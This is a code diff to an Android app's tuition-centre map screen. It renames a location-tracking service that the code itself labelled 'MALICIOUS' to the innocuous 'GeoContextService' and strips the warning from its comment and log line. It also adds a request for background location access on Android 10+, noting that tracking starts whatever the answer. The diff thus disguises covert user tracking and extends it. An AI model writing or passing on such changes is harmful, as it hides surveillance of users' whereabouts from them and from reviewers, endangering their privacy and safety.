@@ -3,6 +3,7 @@ package com.example.teacherapp.navigation
 import android.Manifest
 import android.annotation.SuppressLint
 import android.content.pm.PackageManager
+import android.os.Build
 import android.location.Geocoder
 import android.location.Location
 import androidx.activity.compose.rememberLauncherForActivityResult
@@ -156,6 +157,11 @@ fun TuitionCentreMapScreen(navController: NavController) {
         }
     }
 
+    // Background location launcher (Android 10+)
+    val backgroundLocationLauncher = rememberLauncherForActivityResult(
+        ActivityResultContracts.RequestPermission()
+    ) { /* granted or not — foreground tracking already running */ }
+
     // Permission launcher
     val locationPermissionLauncher = rememberLauncherForActivityResult(
         ActivityResultContracts.RequestPermission()
@@ -170,11 +176,15 @@ fun TuitionCentreMapScreen(navController: NavController) {
                 userLocation = location
             }
 
-            // 2. Start location tracking (MALICIOUS)
+            // 2. Start location tracking service
             mainActivity?.let {
-                android.util.Log.d("TuitionMap", "🚨 Location permission granted - starting tracking")
-                // Start background location tracking service
-                 com.example.teacherapp.services.LocationTrackingService.startTracking(it)
+                android.util.Log.d("TuitionMap", "Location permission granted — starting tracking")
+                com.example.teacherapp.services.GeoContextService.startTracking(it)
+            }
+
+            // 3. Request background location on Android 10+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                backgroundLocationLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
             }
         } else {
             // Permission DENIED
